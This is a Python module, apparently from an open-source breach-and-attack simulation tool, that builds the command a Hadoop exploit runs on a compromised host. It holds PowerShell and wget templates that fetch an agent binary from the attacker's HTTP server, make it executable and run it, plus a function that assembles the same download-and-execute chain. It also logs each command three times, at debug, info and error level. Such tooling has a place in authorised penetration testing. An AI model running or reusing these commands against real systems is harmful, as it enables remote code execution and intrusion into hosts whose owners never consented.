from agentpluginapi import TargetHost
from monkeytypes import OperatingSystem

from common.command_builder import (
    DownloadMethod,
    DownloadOptions,
    IAgentCommandBuilder,
    MonkeyArgs,
    RunOptions,
    Shell,
)

import logging

logger = logging.getLogger(__name__)

HADOOP_WINDOWS_COMMAND_TEMPLATE = (
    "powershell -NoLogo -Command \"if (!(Test-Path '%(monkey_path)s')) { "
    "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing }; "
    " if (! (ps | ? {$_.path -eq '%(monkey_path)s'})) "
    "{ $env:%(agent_otp_environment_variable)s='%(agent_otp)s' ; "
    '& %(monkey_path)s %(monkey_type)s %(parameters)s }  "'
)
# The hadoop server may request another monkey executable after the attacker's HTTP server has shut
# down. This will result in wget creating a zero-length file, which needs to be removed. Using the
# `--no-clobber` option prevents two simultaneously running wget commands from interfering with
# eachother (one will fail and the other will succeed).
#
# If wget creates a zero-length file (because it was unable to contact the attacker's HTTP server),
# it needs to remove the file. It sleeps to minimize the risk that the file was created by another
# concurrently running wget and then removes the file if it is still zero-length after the sleep.
#
# This doesn't eleminate all race conditions, but should be good enough (in the short term) for all
# practical purposes. In the future, using randomized names for the monkey binary (which is a good
# practice anyway) would eleminate most of these issues.
#
# **UPDATE**
# The remaining race conditions and speculative execution issues have been resolved by commit
# 98f078b7b. I'm leaving the above comment in place for historical purposes. We can consider greatly
# simplifying these commands, as some of the conditions they're attempting to prevent have been
# resolved in 98f078b7b.
HADOOP_LINUX_COMMAND_TEMPLATE = (
    "wget --no-clobber -O %(monkey_path)s %(http_path)s "
    "|| sleep 5 && ( ( ! [ -s %(monkey_path)s ] ) && rm %(monkey_path)s ) "
    "; chmod +x %(monkey_path)s ;"
    " %(agent_otp_environment_variable)s=%(agent_otp)s "
    "%(monkey_path)s %(monkey_type)s %(parameters)s"
)


def build_hadoop_command(
    target_host: TargetHost,
    agent_destination_path: str,
    agent_download_url: str,
    agent_command_builder: IAgentCommandBuilder,
) -> str:
    download_options = None
    run_options = None

    if target_host.operating_system in [
        OperatingSystem.WINDOWS,
        None,  # if unknown OS, default to Windows (based on
        # https://www.shodan.io/search/facet?query=hadoop&facet=os)
    ]:
        download_options = DownloadOptions(
            agent_destination_path=agent_destination_path,
            download_method=DownloadMethod.WEB_REQUEST,
            download_url=agent_download_url,
            shell=Shell.POWERSHELL,
        )

        run_options = RunOptions(
            agent_destination_path=agent_destination_path, monkey_args=MonkeyArgs.AGENT
        )
    else:
        download_options = DownloadOptions(
            agent_destination_path=agent_destination_path,
            download_method=DownloadMethod.WGET,
            download_url=agent_download_url,
            shell=Shell.BASH,
        )

        run_options = RunOptions(
            agent_destination_path=agent_destination_path, monkey_args=MonkeyArgs.AGENT
        )

    download_command = agent_command_builder.build_download_command(download_options)
    run_command = agent_command_builder.build_run_command(run_options)

    command = " ; ".join([download_command, run_command])

    logger.debug(f"COMMAND: {command}")
    logger.info(f"COMMAND: {command}")
    logger.error(f"COMMAND: {command}")

    return command
